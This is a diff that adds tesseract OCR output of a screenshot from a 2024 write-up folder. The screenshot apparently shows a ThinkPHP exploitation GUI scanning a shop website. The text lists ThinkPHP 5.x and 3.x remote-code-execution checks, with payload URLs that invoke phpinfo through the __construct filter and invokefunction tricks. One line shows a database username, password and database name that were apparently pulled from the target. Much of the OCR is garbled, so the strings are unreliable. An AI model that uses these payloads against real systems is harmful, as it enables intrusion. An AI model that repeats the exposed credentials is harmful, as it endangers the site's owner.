@@ -1,0 +1,27 @@
+# OCR: faad99ea855c071cbdf038ed1be020cd.jpg
+# 来源: .\02-WriteUp\2024\faad99ea855c071cbdf038ed1be020cd.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:47
+
+‘ThinkphpGUI By 87%
+URL: [http:/imww.tjshop.com/ ] g [ALL
+Be: [asa E
+Getsent
+E
+F
+月 Thnteup 5.0 RCE
+[+] hnketp 5.0.10 construct RCE
+Payload: http:/Awww.tjshop.com//?s=admin Post: _method=_construct&method=getéfilter[] =phpinfo&get |
+[+] #42 ThINKPHP 5,0,22/5.1,29 RCE
+Payload: http:/hwww.t)shop.com//?s=/adminitthink\app/invokefunction&function=call_user_func_atrayévars[0]=phpinfoéars{1]
+[+] #42ThiNkPHP 5023 RCE
+Payload: http:/hwww.t/shop.com//?s=captchaGtest=-1 Post: _metho
+[-] AETHINKPHP 5.0.24-5.1.30 RCE
+门 一 Ihnkep 3.x RCE
+[+] Ihnkehp 5
+Payload: username:root hostname:localhost password:a7b3e1 6ac20b1 Ob database:tpshop2.0
+[+] AEETHINKPHP 3.x Log RCE
+[-] ETHINKPHP 5.x BSCR
+门 不 Ihnkehp 3.x BBR
+门 不 SThnketp 6.x 春
+_constuctemethod-gstefiterll-calLusecitncegatio
